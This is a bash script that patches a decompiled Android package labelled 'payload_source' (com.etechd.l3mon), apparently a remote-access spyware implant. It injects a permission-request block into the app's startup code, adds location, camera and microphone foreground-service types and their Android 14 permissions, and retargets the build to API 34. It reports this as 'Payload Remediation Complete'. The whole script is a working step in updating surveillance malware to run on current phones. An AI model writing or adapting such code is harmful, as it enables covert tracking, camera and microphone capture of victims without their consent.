#!/bin/bash
# 1. Inject Runtime Permissions into MainActivity.smali (Mac-Safe Perl)
perl -i -pe 'print "    # Injected Permission Request\n" . `cat permission_request.smali` if /invoke-super {p0, p1}, Landroid\/app\/Activity;->onCreate\(Landroid\/os\/Bundle;\)V/' payload_source/smali/com/etechd/l3mon/MainActivity.smali

# 2. Update AndroidManifest.xml Service Types
perl -i -pe 's/foregroundServiceType="dataSync"/foregroundServiceType="dataSync|location|camera|microphone"/g' payload_source/AndroidManifest.xml

# 3. Add Android 14 Foreground Permissions
perl -i -pe 's/(<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" \/>)/$1\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" \/>\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" \/>\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" \/>/' payload_source/AndroidManifest.xml

# 4. Sync apktool.yml to API 34
perl -i -pe "s/targetSdkVersion: '31'/targetSdkVersion: '34'/g" payload_source/apktool.yml
perl -i -pe "s/minSdkVersion: '26'/minSdkVersion: '24'/g" payload_source/apktool.yml

echo "Payload Remediation Complete (Perl Engine)."
